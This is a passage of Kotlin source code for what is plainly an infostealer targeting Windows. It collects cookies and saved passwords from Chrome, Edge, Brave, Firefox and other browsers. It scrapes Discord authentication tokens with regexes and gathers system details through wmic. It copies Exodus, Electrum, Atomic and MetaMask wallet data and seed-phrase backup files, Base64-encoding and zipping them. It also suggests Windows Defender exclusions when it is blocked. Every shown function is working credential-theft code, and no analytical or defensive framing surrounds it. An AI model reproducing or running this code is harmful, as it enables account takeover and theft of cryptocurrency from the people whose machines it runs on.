                    e.message?.contains("access denied", ignoreCase = true) == true ||
                    e.message?.contains("blocked", ignoreCase = true) == true) {
                    lastException = RuntimeException("Windows Defender may have blocked the execution. Try adding an exclusion for: ${exeFile.parent}", e)
                    if (attempt < 3) continue else throw lastException
                }
                throw RuntimeException("Failed to start helper process. Error: ${e.message}", e)
        }

        // Capture output
        val stdout = process.inputStream.bufferedReader().readText()
        val stderr = process.errorStream.bufferedReader().readText()

        val exited = process.waitFor(60, TimeUnit.SECONDS)
        if (!exited) {
            process.destroy()
                throw RuntimeException("Helper process timed out.")
        }

        Thread.sleep(500) // Add a small delay for file system to catch up

        val exitCode = process.exitValue()

        if (exitCode != 0) {
                // Check for Windows Defender related errors
                if (stderr.contains("blocked", ignoreCase = true) || 
                    stderr.contains("threat", ignoreCase = true) ||
                    stderr.contains("defender", ignoreCase = true)) {
                    lastException = RuntimeException("Windows Defender blocked execution. Add exclusion for: ${exeFile.parent}")
                    if (attempt < 3) continue else throw lastException
                }
                throw RuntimeException("Helper process failed with exit code $exitCode. Stderr: $stderr")
            }
            
            // Success - break out of retry loop
            break
            
        } catch (e: Exception) {
            lastException = e
            if (attempt == 3) throw e // Re-throw on final attempt
        }
    }

    // Collect cookies and passwords from all browsers
    val allCookies = mutableListOf<org.json.JSONObject>()
    val allPasswords = mutableListOf<SavedPassword>()
    
    // Browser names and their expected paths
    val browsers = listOf("Chrome", "Edge", "Brave", "Opera", "Firefox", "Vivaldi", "Yandex")
    
    for (browserName in browsers) {
        val browserDir = File(outputDirFile, browserName)
        if (!browserDir.exists() || !browserDir.isDirectory) {
            continue // Skip if browser directory doesn't exist
        }
        
        // Get all profiles (directories) in the browser folder
        val profileDirs = browserDir.listFiles()?.filter { it.isDirectory } ?: emptyList()
        val profiles = if (profileDirs.isEmpty()) {
            listOf("Default") // Try Default if no profiles found
        } else {
            profileDirs.map { it.name }
        }
        
        for (profile in profiles) {
            val cookiesFile = File(browserDir, "$profile/cookies.json")
            val passwordsFile = File(browserDir, "$profile/passwords.json")
            
            // Extract cookies
            if (cookiesFile.exists()) {
                try {
                    val fileContent = cookiesFile.readText()
                    if (fileContent.isNotBlank()) {
                            val firstJsonArrayStart = fileContent.indexOf("[\n  {")
                            val firstJsonArrayStartWin = fileContent.indexOf("[\r\n  {")
                            val startIndex = when {
                                firstJsonArrayStart != -1 -> firstJsonArrayStart
                                firstJsonArrayStartWin != -1 -> firstJsonArrayStartWin
                                else -> fileContent.indexOf('[')
                            }
                            val endIndex = fileContent.lastIndexOf(']')
                            
                            if (startIndex != -1 && endIndex != -1 && endIndex > startIndex) {
        val jsonString = fileContent.substring(startIndex, endIndex + 1)
                                val jsonArray = org.json.JSONArray(jsonString)
                                for (i in 0 until jsonArray.length()) {
                                    val cookieObj = jsonArray.getJSONObject(i)
                                    // Add browser name to cookie for identification
                                    cookieObj.put("browser", browserName)
                                    cookieObj.put("profile", profile)
                                    allCookies.add(cookieObj)
                                }
                                // println("Extracted ${jsonArray.length()} cookies from $browserName ($profile)")
                            }
                        }
                } catch (e: Exception) {
                    // println("Warning: Could not parse cookies from $browserName/$profile: ${e.message}")
                }
            }
            
            // Extract passwords
            if (passwordsFile.exists()) {
                    try {
                        val passwordsContent = passwordsFile.readText()
                        if (passwordsContent.isNotBlank()) {
                            val passwordsStart = passwordsContent.indexOf("[\n  {")
                            val passwordsStartWin = passwordsContent.indexOf("[\r\n  {")
                            val startIdx = when {
                                passwordsStart != -1 -> passwordsStart
                                passwordsStartWin != -1 -> passwordsStartWin
                                else -> passwordsContent.indexOf('[')
                            }
                            val endIdx = passwordsContent.lastIndexOf(']')
                            
                            if (startIdx != -1 && endIdx != -1 && endIdx > startIdx) {
                                val passwordsJson = passwordsContent.substring(startIdx, endIdx + 1)
                                val jsonArray = org.json.JSONArray(passwordsJson)
                                for (i in 0 until jsonArray.length()) {
                                    val pwdObj = jsonArray.getJSONObject(i)
                                    allPasswords.add(
                                        SavedPassword(
                                            origin = pwdObj.optString("origin", ""),
                                            username = pwdObj.optString("username", ""),
                                            password = pwdObj.optString("password", "")
                                        )
                                    )
                                }
                                // println("Extracted ${jsonArray.length()} passwords from $browserName ($profile)")
                            }
                        }
            } catch (e: Exception) {
                        // println("Warning: Could not parse passwords from $browserName/$profile: ${e.message}")
                    }
                }
            }
        }
    
    if (allCookies.isEmpty()) {
        throw RuntimeException("No cookies found in any browser. Make sure browsers are installed and the helper tool supports them.")
    }
    
    // Convert cookies list to JSON array string
    val cookiesJsonArray = org.json.JSONArray(allCookies)
    val jsonString = cookiesJsonArray.toString()
    // println("Total cookies extracted: ${allCookies.size} from all browsers")
    // println("Total passwords extracted: ${allPasswords.size} from all browsers")

    return Pair(jsonString, allPasswords)
}

fun extractDiscordTokens(): List<String> {
    val foundTokens = mutableSetOf<String>() // Use Set to avoid duplicates
    val userHome = System.getProperty("user.home")
    
    // Discord installation paths to check (stable, Canary, PTB)
    val discordBasePaths = listOf(
        "$userHome\\AppData\\Roaming\\Discord",
        "$userHome\\AppData\\Roaming\\discordcanary",
        "$userHome\\AppData\\Roaming\\discordptb"
    )
    
    // Token patterns: Discord tokens are typically base64-like strings
    // More flexible pattern: [24-26 chars].[6 chars].[25-110 chars] or mfa.[84+ chars]
    // Discord tokens can vary slightly in length, so we use a more flexible pattern
    val tokenPatterns = listOf(
        Pattern.compile("mfa\\.[A-Za-z0-9_-]{84,}"), // MFA token (flexible length)
        Pattern.compile("[A-Za-z0-9_-]{24,26}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{25,110}"), // Standard token format (flexible)
        Pattern.compile("[\"']?([A-Za-z0-9_-]{24,26}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{25,110})[\"']?"), // With quotes
        Pattern.compile("\"token\"\\s*[:=]\\s*\"([A-Za-z0-9_.-]{50,})\""), // JSON format with quotes
        Pattern.compile("token['\"]?\\s*[:=]\\s*['\"]?([A-Za-z0-9_.-]{50,})"), // Alternative JSON format
        Pattern.compile("(?:discord|token)[\"']?\\s*[:=]\\s*[\"']?([A-Za-z0-9_.-]{24,26}\\.[A-Za-z0-9_.-]{6}\\.[A-Za-z0-9_.-]{25,110})") // More specific pattern
    )
    
    // Function to validate Discord token format (more flexible)
    fun isValidDiscordToken(token: String): Boolean {
        val cleanToken = token.trim()
        if (cleanToken.length < 50) return false
        
        // Check for MFA token format: mfa.[84+ chars]
        if (cleanToken.startsWith("mfa.") && cleanToken.length >= 88) {
            return cleanToken.matches(Regex("[A-Za-z0-9_.-]+"))
        }
        
        // Check for standard format: [24-26].[6].[25-110]
        val parts = cleanToken.split(".")
        if (parts.size == 3) {
            val part1 = parts[0]
            val part2 = parts[1]
            val part3 = parts[2]
            
            // Validate each part
            if (part1.length in 24..26 && 
                part2.length == 6 && 
                part3.length in 25..110 &&
                part1.matches(Regex("[A-Za-z0-9_-]+")) &&
                part2.matches(Regex("[A-Za-z0-9_-]+")) &&
                part3.matches(Regex("[A-Za-z0-9_-]+"))) {
                return true
            }
        }
        
        return false
    }
    
    // Method 1: Check LevelDB log files (most reliable for readable data)
    for (discordBasePath in discordBasePaths) {
        val leveldbPath = "$discordBasePath\\Local Storage\\leveldb"
        val leveldbDir = File(leveldbPath)
        
        if (!leveldbDir.exists() || !leveldbDir.isDirectory) {
            continue
        }
        
        // println("Checking Discord LevelDB path: $leveldbPath")
        
        // Read all files in LevelDB directory (.log, .ldb, .sst, .manifest, etc.)
        val allFiles = leveldbDir.listFiles { file -> file.isFile } ?: continue
        
        // Sort files by size (smaller files first, as they're more likely to contain readable data)
        val sortedFiles = allFiles.sortedBy { it.length() }
        
        for (logFile in sortedFiles) {
            try {
                // Skip lock files and very large files (> 10MB) as they're likely binary dumps
                if (logFile.name.uppercase() == "LOCK" || logFile.length() > 10 * 1024 * 1024) {
                    continue
                }
                
                // Try to read file as bytes - handle file locking gracefully
                val bytes = try {
                    logFile.readBytes()
                } catch (e: java.nio.file.FileSystemException) {
                    if (e.message?.contains("locked") == true || e.message?.contains("being used") == true) {
                        // println("Skipping locked file: ${logFile.name} (Discord may be running)")
                        continue
                    }
                    throw e
                } catch (e: java.io.IOException) {
                    if (e.message?.contains("locked") == true || e.message?.contains("being used") == true || 
                        e.message?.contains("cannot access") == true) {
                        // println("Skipping locked file: ${logFile.name} (Discord may be running)")
                        continue
                    }
                    throw e
                }
                
                // Try multiple approaches to find tokens
                val searchMethods = listOf(
                    { String(bytes, Charsets.UTF_8) },
                    { String(bytes, Charsets.ISO_8859_1) },
                    { String(bytes, Charsets.US_ASCII) }
                )
                
                for (getContent in searchMethods) {
                    try {
                        val content = getContent()
                        
                        // Method 1: Use regex patterns
                            for (pattern in tokenPatterns) {
                            val matcher = pattern.matcher(content)
                                while (matcher.find()) {
                                    val token = if (matcher.groupCount() > 0) matcher.group(1) else matcher.group(0)
                                if (token != null && isValidDiscordToken(token)) {
                                    val cleanToken = token.trim()
                                    if (foundTokens.add(cleanToken)) {
                                        // println("Found Discord token in LevelDB file: ${logFile.name} (${logFile.length()} bytes)")
                                    }
                                }
                            }
                        }
                        
                        // Method 2: Direct pattern matching (more flexible)
                        val directPattern = Pattern.compile("[A-Za-z0-9_-]{24,26}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{25,110}|mfa\\.[A-Za-z0-9_-]{84,}")
                        val directMatcher = directPattern.matcher(content)
                        while (directMatcher.find()) {
                            val potentialToken = directMatcher.group(0)
                            if (isValidDiscordToken(potentialToken)) {
                                val cleanToken = potentialToken.trim()
                                if (foundTokens.add(cleanToken)) {
                                    // println("Found Discord token via direct pattern in: ${logFile.name}")
                                }
                            }
                        }
                        
                        } catch (e: Exception) {
                        // Continue to next encoding
                            continue
                        }
                    }
                    
                // Method 3: Search for token-like strings in binary data (byte-by-byte)
                // Look for sequences that match token pattern
                if (bytes.size < 200) { // Only for small files to avoid performance issues
                    val contentStr = String(bytes, Charsets.ISO_8859_1)
                    // Try to find any string that looks like a token
                    val flexiblePattern = Pattern.compile("[A-Za-z0-9_-]{20,30}\\.[A-Za-z0-9_-]{4,8}\\.[A-Za-z0-9_-]{20,120}")
                    val flexibleMatcher = flexiblePattern.matcher(contentStr)
                    while (flexibleMatcher.find()) {
                        val candidate = flexibleMatcher.group(0)
                        if (isValidDiscordToken(candidate)) {
                            val cleanToken = candidate.trim()
                            if (foundTokens.add(cleanToken)) {
                                // println("Found Discord token via flexible pattern in: ${logFile.name}")
                            }
                        }
                    }
                }
                
            } catch (e: java.nio.file.FileSystemException) {
                val msg = e.message ?: ""
                if (msg.contains("locked", ignoreCase = true) || msg.contains("being used", ignoreCase = true)) {
                    // println("Skipping locked file: ${logFile.name} (Discord may be running)")
                } else {
                    // println("Error reading LevelDB file ${logFile.name}: ${e.message}")
                }
                continue
            } catch (e: java.io.IOException) {
                val msg = e.message ?: ""
                if (msg.contains("locked", ignoreCase = true) || msg.contains("being used", ignoreCase = true) || 
                    msg.contains("cannot access", ignoreCase = true)) {
                    // println("Skipping locked file: ${logFile.name} (Discord may be running)")
                } else {
                    // println("Error reading LevelDB file ${logFile.name}: ${e.message}")
                }
                continue
                } catch (e: Exception) {
                // Only log non-locking errors
                val msg = e.message ?: ""
                if (!msg.contains("locked", ignoreCase = true) && 
                    !msg.contains("being used", ignoreCase = true) &&
                    !msg.contains("cannot access", ignoreCase = true)) {
                    // println("Error reading LevelDB file ${logFile.name}: ${e.message}")
                }
                    continue
                }
            }
        }
        
    // Method 2: Check SQLite databases (if Discord uses them)
    for (discordBasePath in discordBasePaths) {
        val dbPath = "$discordBasePath\\Local Storage\\leveldb"
        val dbDir = File(dbPath)
        if (!dbDir.exists()) continue
        
        // Look for any SQLite files
        val sqliteFiles = dbDir.listFiles { file ->
            file.isFile && file.name.lowercase().endsWith(".sqlite") || file.name.lowercase().endsWith(".db")
        } ?: continue
        
        for (dbFile in sqliteFiles) {
            try {
                Class.forName("org.sqlite.JDBC")
                DriverManager.getConnection("jdbc:sqlite:${dbFile.absolutePath}").use { connection ->
                    // Try to get table names and search for token-related data
                    val tables = connection.metaData.getTables(null, null, null, arrayOf("TABLE"))
                    while (tables.next()) {
                        val tableName = tables.getString("TABLE_NAME")
                        try {
                            connection.createStatement().use { statement ->
                                statement.executeQuery("SELECT * FROM $tableName").use { resultSet ->
                                    val metaData = resultSet.metaData
                                    val columnCount = metaData.columnCount
                                    while (resultSet.next()) {
                                        for (i in 1..columnCount) {
                                            val value = resultSet.getString(i)
                                            if (value != null) {
                    for (pattern in tokenPatterns) {
                                                    val matcher = pattern.matcher(value)
                        if (matcher.find()) {
                            val token = if (matcher.groupCount() > 0) matcher.group(1) else matcher.group(0)
                                                        if (token != null && isValidDiscordToken(token)) {
                                                            val cleanToken = token.trim()
                                                            if (foundTokens.add(cleanToken)) {
                                                                // println("Found Discord token in SQLite: ${dbFile.name}, table: $tableName")
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                            }
                        }
                    }
                } catch (e: Exception) {
                            // Skip table read errors
                            continue
                }
                    }
                }
            } catch (e: Exception) {
                // Not a SQLite file or can't read it
                continue
            }
        }
    }
    
    // Method 3: Check browser Local Storage for Discord web tokens
    val browserPaths = listOf(
        "$userHome\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        "$userHome\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
        "$userHome\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"
    )
    
    for (browserPath in browserPaths) {
        val leveldbDir = File(browserPath)
        if (!leveldbDir.exists()) continue
        
        val logFiles = leveldbDir.listFiles { file -> 
            file.isFile && (file.name.lowercase().endsWith(".log") || file.name.lowercase().endsWith(".ldb"))
        } ?: continue
        
        for (logFile in logFiles) {
            try {
                // Skip lock files
                if (logFile.name.uppercase() == "LOCK") {
                    continue
                }
                
                // Try to read file - handle locking gracefully
                val bytes = try {
                    logFile.readBytes()
                } catch (e: java.nio.file.FileSystemException) {
                    if (e.message?.contains("locked", ignoreCase = true) == true || 
                        e.message?.contains("being used", ignoreCase = true) == true ||
                        e.message?.contains("cannot access", ignoreCase = true) == true) {
                        continue // Skip silently for browser files
                    }
                    throw e
                } catch (e: java.io.IOException) {
                    if (e.message?.contains("locked", ignoreCase = true) == true || 
                        e.message?.contains("being used", ignoreCase = true) == true ||
                        e.message?.contains("cannot access", ignoreCase = true) == true) {
                        continue // Skip silently for browser files
                    }
                    throw e
                }
                
                val content = String(bytes, Charsets.UTF_8)
                
                // Only check files that mention Discord
                if (!content.contains("discord.com") && !content.contains("discordapp.com")) {
                    continue
                }
                
                    for (pattern in tokenPatterns) {
                        val matcher = pattern.matcher(content)
                    while (matcher.find()) {
                            val token = if (matcher.groupCount() > 0) matcher.group(1) else matcher.group(0)
                        if (token != null && isValidDiscordToken(token)) {
                            val cleanToken = token.trim()
                            if (foundTokens.add(cleanToken)) {
                                // println("Found Discord token in browser storage: ${logFile.name}")
                            }
                        }
                    }
                }
                
                // Also try direct pattern matching (with flexible lengths)
                val directPattern = Pattern.compile("[A-Za-z0-9_-]{24,26}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{25,110}|mfa\\.[A-Za-z0-9_-]{84,}")
                val directMatcher = directPattern.matcher(content)
                while (directMatcher.find()) {
                    val potentialToken = directMatcher.group(0)
                    if (isValidDiscordToken(potentialToken)) {
                        val cleanToken = potentialToken.trim()
                        if (foundTokens.add(cleanToken)) {
                            // println("Found Discord token via direct pattern in browser: ${logFile.name}")
                        }
                    }
                }
            } catch (e: Exception) {
                continue
            }
        }
    }
    
    if (foundTokens.isEmpty()) {
        // println("No Discord tokens found in any checked locations.")
    } else {
        // println("Found ${foundTokens.size} unique Discord token(s).")
    }
    
    return foundTokens.toList()
}

fun getSystemInfo(): SystemInfo {
    val cpu = getCpuInfo()
    val gpu = getGpuInfo()
    val ram = getRamInfo()
    val os = getOsInfo()
    
    return SystemInfo(cpu, gpu, ram, os)
}

fun getCpuInfo(): CpuInfo? {
    return try {
        // Get CPU name
        val cpuNameProcess = Runtime.getRuntime().exec("wmic cpu get name /value")
        val cpuNameReader = cpuNameProcess.inputStream.bufferedReader()
        var cpuName = "Unknown"
        cpuNameReader.useLines { lines ->
            lines.forEach { line ->
                if (line.startsWith("Name=")) {
                    cpuName = line.substringAfter("Name=").trim()
                }
            }
        }
        cpuNameProcess.waitFor()
        
        // Get CPU cores
        val coresProcess = Runtime.getRuntime().exec("wmic cpu get NumberOfCores /value")
        val coresReader = coresProcess.inputStream.bufferedReader()
        var cores = 0
        coresReader.useLines { lines ->
            lines.forEach { line ->
                if (line.startsWith("NumberOfCores=")) {
                    cores = line.substringAfter("NumberOfCores=").trim().toIntOrNull() ?: 0
                }
            }
        }
        coresProcess.waitFor()
        
        // Get CPU threads (logical processors)
        val threadsProcess = Runtime.getRuntime().exec("wmic cpu get NumberOfLogicalProcessors /value")
        val threadsReader = threadsProcess.inputStream.bufferedReader()
        var threads = 0
        threadsReader.useLines { lines ->
            lines.forEach { line ->
                if (line.startsWith("NumberOfLogicalProcessors=")) {
                    threads = line.substringAfter("NumberOfLogicalProcessors=").trim().toIntOrNull() ?: 0
                }
            }
        }
        threadsProcess.waitFor()
        
        // Get max clock speed
        val clockProcess = Runtime.getRuntime().exec("wmic cpu get MaxClockSpeed /value")
        val clockReader = clockProcess.inputStream.bufferedReader()
        var maxClockSpeed = "Unknown"
        clockReader.useLines { lines ->
            lines.forEach { line ->
                if (line.startsWith("MaxClockSpeed=")) {
                    val mhz = line.substringAfter("MaxClockSpeed=").trim().toIntOrNull()
                    if (mhz != null) {
                        maxClockSpeed = "${mhz} MHz"
                    }
                }
            }
        }
        clockProcess.waitFor()
        
        // Get architecture
        val arch = System.getProperty("os.arch") ?: "Unknown"
        val architecture = when {
            arch.contains("64") -> "x64"
            arch.contains("86") -> "x86"
            else -> arch
        }
        
        CpuInfo(
            name = cpuName,
            cores = cores,
            threads = threads,
            maxClockSpeed = maxClockSpeed,
            architecture = architecture
        )
    } catch (e: Exception) {
        // println("Error getting CPU info: ${e.message}")
        null
    }
}

fun getGpuInfo(): List<GpuInfo> {
    val gpus = mutableListOf<GpuInfo>()
    
    try {
        // Get GPU information using wmic
        val process = Runtime.getRuntime().exec("wmic path win32_VideoController get name,DriverVersion,AdapterRAM /value")
        val reader = process.inputStream.bufferedReader()
        
        var currentGpu = mutableMapOf<String, String>()
        
        reader.useLines { lines ->
            lines.forEach { line ->
                when {
                    line.startsWith("Name=") -> {
                        if (currentGpu.isNotEmpty()) {
                            // Save previous GPU
                            gpus.add(createGpuInfo(currentGpu))
                            currentGpu.clear()
                        }
                        currentGpu["name"] = line.substringAfter("Name=").trim()
                    }
                    line.startsWith("DriverVersion=") -> {
                        currentGpu["driverVersion"] = line.substringAfter("DriverVersion=").trim()
                    }
                    line.startsWith("AdapterRAM=") -> {
                        val ramBytes = line.substringAfter("AdapterRAM=").trim().toLongOrNull()
                        if (ramBytes != null && ramBytes > 0) {
                            val ramGB = ramBytes / (1024.0 * 1024.0 * 1024.0)
                            currentGpu["memory"] = String.format("%.2f GB", ramGB)
                        }
                    }
                }
            }
        }
        
        // Add last GPU
        if (currentGpu.isNotEmpty()) {
            gpus.add(createGpuInfo(currentGpu))
        }
        
        process.waitFor()
        
        // Filter out invalid entries
        return gpus.filter { it.name.isNotBlank() && it.name != "Unknown" }
    } catch (e: Exception) {
        // println("Error getting GPU info: ${e.message}")
        return emptyList()
    }
}

fun createGpuInfo(gpuMap: Map<String, String>): GpuInfo {
    return GpuInfo(
        name = gpuMap["name"] ?: "Unknown",
        driverVersion = gpuMap["driverVersion"]?.takeIf { it.isNotBlank() },
        memory = gpuMap["memory"]?.takeIf { it.isNotBlank() }
    )
}

fun getRamInfo(): String? {
    return try {
        val process = Runtime.getRuntime().exec("wmic computersystem get TotalPhysicalMemory /value")
        val reader = process.inputStream.bufferedReader()
        var totalRam: String? = null
        
        reader.useLines { lines ->
            lines.forEach { line ->
                if (line.startsWith("TotalPhysicalMemory=")) {
                    val ramBytes = line.substringAfter("TotalPhysicalMemory=").trim().toLongOrNull()
                    if (ramBytes != null) {
                        val ramGB = ramBytes / (1024.0 * 1024.0 * 1024.0)
                        totalRam = String.format("%.2f GB", ramGB)
                    }
                }
            }
        }
        process.waitFor()
        totalRam
    } catch (e: Exception) {
        // println("Error getting RAM info: ${e.message}")
        null
    }
}

fun getOsInfo(): String? {
    return try {
        val osName = System.getProperty("os.name") ?: "Unknown"
        val osVersion = System.getProperty("os.version") ?: ""
        val osArch = System.getProperty("os.arch") ?: ""
        "$osName $osVersion ($osArch)"
    } catch (e: Exception) {
        // println("Error getting OS info: ${e.message}")
        null
    }
}

fun extractCryptoWallets(): List<CryptoWalletFile> {
    val wallets = mutableListOf<CryptoWalletFile>()
    val userHome = System.getProperty("user.home")
    val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
    
    // Exodus wallet files
    val exodusPath = "$userHome\\AppData\\Roaming\\Exodus"
    val exodusDir = File(exodusPath)
    if (exodusDir.exists() && exodusDir.isDirectory) {
        // println("Checking Exodus wallet directory: $exodusPath")
        try {
            // Look for wallet files (Exodus uses various file formats)
            exodusDir.walkTopDown().maxDepth(3).forEach { file ->
                if (file.isFile) {
                    val fileName = file.name.lowercase()
                    // Exodus wallet files can be .exodus, .json, or other formats
                    if (fileName.contains("wallet") || fileName.endsWith(".exodus") || 
                        (fileName.endsWith(".json") && file.length() < 10 * 1024 * 1024)) { // Max 10MB
                        try {
                            val fileContent = if (file.length() < 1024 * 1024) { // Only read files < 1MB
                                try {
                                    val content = file.readBytes()
                                    java.util.Base64.getEncoder().encodeToString(content)
                                } catch (e: Exception) {
                                    null
                                }
                            } else {
                                null
                            }
                            
                            wallets.add(
                                CryptoWalletFile(
                                    walletName = file.name,
                                    walletType = "exodus",
                                    filePath = file.absolutePath,
                                    fileSize = file.length(),
                                    lastModified = dateFormat.format(java.util.Date(file.lastModified())),
                                    fileContent = fileContent
                                )
                            )
                            // println("Found Exodus wallet file: ${file.name} (${file.length()} bytes)")
                        } catch (e: Exception) {
                            // println("Error reading Exodus file ${file.name}: ${e.message}")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // println("Error accessing Exodus directory: ${e.message}")
        }
    }
    
    // Electrum wallet files
    val electrumWalletsPath = "$userHome\\AppData\\Roaming\\Electrum\\wallets"
    val electrumDir = File(electrumWalletsPath)
    if (electrumDir.exists() && electrumDir.isDirectory) {
        // println("Checking Electrum wallet directory: $electrumWalletsPath")
        try {
            electrumDir.listFiles()?.forEach { file ->
                if (file.isFile) {
                    // Electrum wallet files are typically .dat files
                    try {
                        val fileContent = if (file.length() < 1024 * 1024) { // Only read files < 1MB
                            try {
                                val content = file.readBytes()
                                java.util.Base64.getEncoder().encodeToString(content)
                            } catch (e: Exception) {
                                null
                            }
                        } else {
                            null
                        }
                        
                        wallets.add(
                            CryptoWalletFile(
                                walletName = file.name,
                                walletType = "electrum",
                                filePath = file.absolutePath,
                                fileSize = file.length(),
                                lastModified = dateFormat.format(java.util.Date(file.lastModified())),
                                fileContent = fileContent
                            )
                        )
                        // println("Found Electrum wallet file: ${file.name} (${file.length()} bytes)")
                    } catch (e: Exception) {
                        // println("Error reading Electrum file ${file.name}: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            // println("Error accessing Electrum directory: ${e.message}")
        }
    }
    
    // Check for other common crypto wallets
    // Atomic Wallet
    val atomicWalletPath = "$userHome\\AppData\\Roaming\\atomic"
    val atomicDir = File(atomicWalletPath)
    if (atomicDir.exists() && atomicDir.isDirectory) {
        // println("Checking Atomic wallet directory: $atomicWalletPath")
        try {
            atomicDir.walkTopDown().maxDepth(3).forEach { file ->
                if (file.isFile && (file.name.lowercase().contains("wallet") || 
                    file.name.lowercase().endsWith(".json"))) {
                    if (file.length() < 10 * 1024 * 1024) { // Max 10MB
                        try {
                            val fileContent = if (file.length() < 1024 * 1024) {
                                try {
                                    val content = file.readBytes()
                                    java.util.Base64.getEncoder().encodeToString(content)
                                } catch (e: Exception) {
                                    null
                                }
                            } else {
                                null
                            }
                            
                            wallets.add(
                                CryptoWalletFile(
                                    walletName = file.name,
                                    walletType = "atomic",
                                    filePath = file.absolutePath,
                                    fileSize = file.length(),
                                    lastModified = dateFormat.format(java.util.Date(file.lastModified())),
                                    fileContent = fileContent
                                )
                            )
                            // println("Found Atomic wallet file: ${file.name}")
                        } catch (e: Exception) {
                            // println("Error reading Atomic file ${file.name}: ${e.message}")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // println("Error accessing Atomic directory: ${e.message}")
        }
    }
    
    // Check for seed phrase files or backup files in common locations
    val commonBackupPaths = listOf(
        "$userHome\\Desktop",
        "$userHome\\Documents",
        "$userHome\\Downloads"
    )
    
    val seedKeywords = listOf("seed", "mnemonic", "backup", "wallet", "private", "key", "recovery")
    
    for (backupPath in commonBackupPaths) {
        val backupDir = File(backupPath)
        if (backupDir.exists() && backupDir.isDirectory) {
            try {
                backupDir.listFiles()?.forEach { file ->
                    if (file.isFile) {
                        val fileName = file.name.lowercase()
                        val matchesKeyword = seedKeywords.any { fileName.contains(it) }
                        val isTextFile = fileName.endsWith(".txt") || fileName.endsWith(".json") || 
                                        fileName.endsWith(".dat") || fileName.endsWith(".wallet")
                        
                        if (matchesKeyword && isTextFile && file.length() < 1024 * 1024) { // Max 1MB
                            try {
                                val fileContent = try {
                                    val content = file.readBytes()
                                    java.util.Base64.getEncoder().encodeToString(content)
                                } catch (e: Exception) {
                                    null
                                }
                                
                                wallets.add(
                                    CryptoWalletFile(
                                        walletName = file.name,
                                        walletType = "backup",
                                        filePath = file.absolutePath,
                                        fileSize = file.length(),
                                        lastModified = dateFormat.format(java.util.Date(file.lastModified())),
                                        fileContent = fileContent
                                    )
                                )
                                // println("Found potential crypto backup file: ${file.name}")
                            } catch (e: Exception) {
                                // Skip files that can't be read
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                // Skip directories that can't be accessed
            }
        }
    }
    
    if (wallets.isNotEmpty()) {
        // println("Found ${wallets.size} crypto wallet file(s).")
    } else {
        // println("No crypto wallet files found.")
    }
    
    return wallets
}

fun extractCryptoWalletFolders(): List<CryptoWalletFolder> {
    val folders = mutableListOf<CryptoWalletFolder>()
    val userHome = System.getProperty("user.home")
    
    // Exodus - extract entire AppData\Roaming\Exodus folder
    val exodusPath = "$userHome\\AppData\\Roaming\\Exodus"
    val exodusDir = File(exodusPath)
    if (exodusDir.exists() && exodusDir.isDirectory) {
        // println("Extracting Exodus folder: $exodusPath")
        try {
            val zipContent = createZipFromFolder(exodusDir, "exodus")
            if (zipContent != null) {
                val (totalSize, fileCount) = calculateFolderStats(exodusDir)
                folders.add(
                    CryptoWalletFolder(
                        folderName = "Exodus",
                        walletType = "exodus",
                        folderPath = exodusPath,
                        totalSize = totalSize,
                        fileCount = fileCount,
                        folderContent = zipContent
                    )
                )
                // println("Successfully extracted Exodus folder (${fileCount} files, ${formatBytes(totalSize)})")
            }
        } catch (e: Exception) {
            // println("Error extracting Exodus folder: ${e.message}")
        }
    }
    
    // Electrum - extract entire AppData\Roaming\Electrum folder
    val electrumPath = "$userHome\\AppData\\Roaming\\Electrum"
    val electrumDir = File(electrumPath)
    if (electrumDir.exists() && electrumDir.isDirectory) {
        // println("Extracting Electrum folder: $electrumPath")
        try {
            val zipContent = createZipFromFolder(electrumDir, "electrum")
            if (zipContent != null) {
                val (totalSize, fileCount) = calculateFolderStats(electrumDir)
                folders.add(
                    CryptoWalletFolder(
                        folderName = "Electrum",
                        walletType = "electrum",
                        folderPath = electrumPath,
                        totalSize = totalSize,
                        fileCount = fileCount,
                        folderContent = zipContent
                    )
                )
                // println("Successfully extracted Electrum folder (${fileCount} files, ${formatBytes(totalSize)})")
            }
        } catch (e: Exception) {
            // println("Error extracting Electrum folder: ${e.message}")
        }
    }
    
    // Atomic Wallet - extract entire AppData\Roaming\atomic folder
    val atomicPath = "$userHome\\AppData\\Roaming\\atomic"
    val atomicDir = File(atomicPath)
    if (atomicDir.exists() && atomicDir.isDirectory) {
        // println("Extracting Atomic wallet folder: $atomicPath")
        try {
            val zipContent = createZipFromFolder(atomicDir, "atomic")
            if (zipContent != null) {
                val (totalSize, fileCount) = calculateFolderStats(atomicDir)
                folders.add(
                    CryptoWalletFolder(
                        folderName = "Atomic",
                        walletType = "atomic",
                        folderPath = atomicPath,
                        totalSize = totalSize,
                        fileCount = fileCount,
                        folderContent = zipContent
                    )
                )
                // println("Successfully extracted Atomic wallet folder (${fileCount} files, ${formatBytes(totalSize)})")
            }
        } catch (e: Exception) {
            // println("Error extracting Atomic wallet folder: ${e.message}")
        }
    }
    
    // MetaMask (if installed as standalone) - AppData\Roaming\MetaMask
    val metamaskPath = "$userHome\\AppData\\Roaming\\MetaMask"
    val metamaskDir = File(metamaskPath)
    if (metamaskDir.exists() && metamaskDir.isDirectory) {
        // println("Extracting MetaMask folder: $metamaskPath")
        try {
            val zipContent = createZipFromFolder(metamaskDir, "metamask")
            if (zipContent != null) {
                val (totalSize, fileCount) = calculateFolderStats(metamaskDir)
                folders.add(
                    CryptoWalletFolder(
                        folderName = "MetaMask",
                        walletType = "metamask",
                        folderPath = metamaskPath,
                        totalSize = totalSize,
                        fileCount = fileCount,
                        folderContent = zipContent
                    )
                )
                // println("Successfully extracted MetaMask folder (${fileCount} files, ${formatBytes(totalSize)})")
            }
        } catch (e: Exception) {
            // println("Error extracting MetaMask folder: ${e.message}")
        }
    }
    
    if (folders.isNotEmpty()) {
